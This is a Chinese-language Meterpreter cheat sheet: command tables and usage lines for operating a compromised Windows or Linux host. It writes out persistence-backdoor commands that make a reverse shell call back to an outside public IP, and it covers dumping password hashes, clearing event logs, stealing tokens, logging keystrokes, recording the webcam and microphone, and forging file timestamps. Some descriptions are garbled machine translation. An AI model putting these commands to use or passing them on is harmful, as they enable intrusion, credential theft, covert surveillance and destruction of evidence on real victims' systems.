# Meterpreter是一种先进的，可动态扩展的有效负载

它使用内存中的 DLL注入阶段，并在运行时通过网络扩展。它通过stager套接字进行通信并提供全面的客户端Ruby API。


background=bg 会话发送到后台并返回到msf提示符

clearev   命令将清除Windows系统上的应用程序，系统和安全日志。
download  download /etc/passwd /tmp  提供Windows路径时使用双斜线。
edit  命令打开位于目标主机上的文件。它使用'vim'，所有编辑器的命令都可用。 edit /home/1.txt
execute 在目标上运行一个命令。  execute -f cmd.exe -i -H
getuid  显示Meterpreter服务器在主机上运行的用户。
ps  命令显示目标上正在运行的进程的列表。
resource 命令将执行位于文本文件内的Meterpreter指令。 每行包含一个条目，“资源”将按顺序执行每行。echo 'ls \n pwd '>1.txt && resource 1.txt
search  命令供了一种在目标主机上查找特定文件的方法  search -f xiao
shell   命令将为您提供目标系统上的标准shell。
upload   与“download”命令一样，您需要使用上传命令使用双斜线。 upload /tmp/user /home



set exitonsession false  开启允许多个连接

run -j   后台运行

show advanced 

建立持续性后门
run persistence -h

    -A   自动启动一个匹配的exploit / multi / handler来连接到代理
    -L   如果未使用％TEMP％，则在目标主机中写入有效负载的位置。
    -P   有效负载使用，默认为windows / meterpreter / reverse_tcp。
    -S   作为服务自动启动代理程序（具有SYSTEM权限）
    -T   要使用的备用可执行模板
    -U   用户登录时自动启动代理
    -X   系统引导时自动启动代理程序
    -h   这个帮助菜单
    -i   每次连接尝试之间的时间间隔（秒）
    -p   运行Metasploit的系统正在侦听的端口
    -r   运行Metasploit监听连接的系统的IP

run persistence -S -U -X -i 5 -p 6666 -r 192.168.190.141
run persistence -S -U -X -i 5 -p 4444 -r 47.95.141.60




Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         帮助菜单
    background                背景当前会话
    bg                        别名为背景
    bgkill                    杀死背景measpreter脚本
    bglist                    列出运行后台脚本
    bgrun                     作为背景线程执行纸张脚本
    channel                   显示信息或控制活动通道
    close                     关闭一个频道
    detach                    分离meterPreter会话（对于HTTP / HTTPS）
    disable_unicode_encoding  禁用Unicode字符串的编码
    enable_unicode_encoding   启用Unicode字符串的编码
    exit                      终止仪表会话
    get_timeouts              获取当前会话超时值
    guid                      获取会话GUID
    help                      帮助菜单
    info                      显示有关帖子模块的信息
    irb                       在当前会话上打开交互式Ruby shell
    load                      加载一个或多个计量级延伸
    machine_id                获取附加到会话的机器的MSF ID
    migrate                   发布模块，您可以迁移到受害者的另一个进程。  
        run post/windows/manage/migrate 
        
    pivot                     管理枢轴听众
    pry                       在当前会话上打开PRY调试器
    quit                      终止仪表会话
    read                      从频道读取数据
    resource                  运行存储在文件中的命令
    run                       执行抄本或帖子模块
    secure                    （重新）在会话上协商TLV数据包加密
    sessions                  快速切换到另一个会话
    set_timeouts              设置当前会话超时值
    sleep                     强制计量器去安静，然后重新建立会议
    ssl_verify                修改SSL证书验证设置
    transport                 管理运输机制
    use                       “加载”弃用别名
    uuid                      获取当前会话的UUID
    write                     将数据写入频道


Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    cat           将文件的内容读到屏幕上
    cd            更改目录
    checksum      检索文件的校验和
    cp            将源复制到目的地
    del           删除指定的文件
    dir           列表文件（LS的别名）
    download      下载文件或目录
    edit          编辑文件
    getlwd        打印本地工作目录
    getwd         打印工作目录
    lcd           更改本地工作目录
    lls           列出本地文件
    lpwd          打印本地工作目录
    ls            列表文件
    mkdir         制作目录
    mv            将源头移到目的地
    pwd           打印工作目录
    rm            删除指定的文件
    rmdir         删除目录
    search        搜索文件
    show_mount    列出所有挂载点/逻辑驱动器
    upload        上传文件或目录


Stdapi: Networking Commands
===========================

    Command       Description
    -------       -----------
    arp           Display the host ARP cache
    getproxy      Display the current proxy configuration
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    netstat       Display the network connections
    portfwd       将本地端口转发到远程服务
    	portfwd add -l 6666 -p 3389 -r 192.168.100.129
    	
    resolve       Resolve a set of host names on the target
    route         View and modify the routing table


Stdapi: System Commands
=======================

    Command       Description
    -------       -----------
    clearev       清除事件日志
    drop_token    放弃任何积极的冒充令牌。
    execute       执行命令
    getenv        获取一个或多个环境变量值
    getpid        获取当前的进程标识符
    getprivs      尝试启用当前进程可用的所有权限
    getsid        获取服务器运行的用户的SID
    getuid        获取用户运行的用户
    kill          终止一个过程
    localtime     显示目标系统本地日期和时间
    pgrep         按名称过滤进程
    pkill         按名称终止流程
    ps            列出运行进程
    reboot        重新启动远程计算机
    reg           与远程注册表修改和交互
    rev2self      在远程计算机上调用reverttoself（）
    shell         删除系统命令shell
    shutdown      关闭远程计算机
    steal_token   尝试从目标过程中窃取模拟令牌
    suspend       暂停或恢复流程列表
    sysinfo       获取有关远程系统的信息，例如操作系统


Stdapi: User interface Commands
===============================

    Command        Description
    -------        -----------
    enumdesktops   列出所有可访问的桌面和窗口站
    getdesktop     获取当前的仪表桌面
    idletime       返回远程用户已ID的秒数
    keyboard_send  发送击键
    keyevent       发送关键事件
    keyscan_dump   转储击键缓冲区
    keyscan_start  开始捕获击键
    keyscan_stop   停止捕获击键
    mouse          发送鼠标事件
    screenshare    实时观看远程用户桌面
    screenshot     抓住交互式桌面的屏幕截图
    setdesktop     更改计量点电流桌面
    uictl          控制一些用户界面组件


Stdapi: Webcam Commands
=======================

    Command        Description
    -------        -----------
    record_mic     从默认麦克风录制音频，用于X秒
    webcam_chat    开始视频聊天
    webcam_list    列出网络摄像头
    webcam_snap    从指定的网络摄像头中获取快照
    webcam_stream  从指定的网络摄像头播放视频流


Stdapi: Audio Output Commands
=============================

    Command       Description
    -------       -----------
    play          在目标系统上播放波形音频文件（.wav）


Priv: Elevate Commands
======================

    Command       Description
    -------       -----------
    getsystem     试图提升您对本地系统的特权。


Priv: Password database Commands
================================

    Command       Description
    -------       -----------
    hashdump      发布模块将转储SAM数据库的内容。       
        run post/windows/gather/hashdump 


Priv: Timestomp Commands
========================

    Command       Description
    -------       -----------
    timestomp     修改文件时间
